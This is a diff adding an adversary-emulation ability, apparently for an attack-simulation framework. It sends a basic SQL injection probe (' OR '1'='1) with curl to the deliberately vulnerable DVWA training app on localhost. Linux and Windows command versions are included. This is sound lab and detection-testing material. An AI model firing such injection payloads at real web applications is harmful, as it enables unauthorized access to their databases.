@@ -1,0 +1,28 @@
+- id: a1b2c3d4-dvwa-0005-sqli-000000000005
+  name: DVWA - SQL Injection Basic Probe (Low)
+  description: Submits basic in-band SQL injection payload
+  tactic: initial-access
+  technique_id: T1190
+  technique_name: Exploit Public-Facing Application
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          "$DVWA_URL/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" > /dev/null || true
+        echo "[+] Dispatched SQL Injection probe"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          "$DvwaUrl/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" | Out-Null
+        Write-Output "[+] Dispatched SQL Injection probe"
+        exit 0
+      timeout: 30
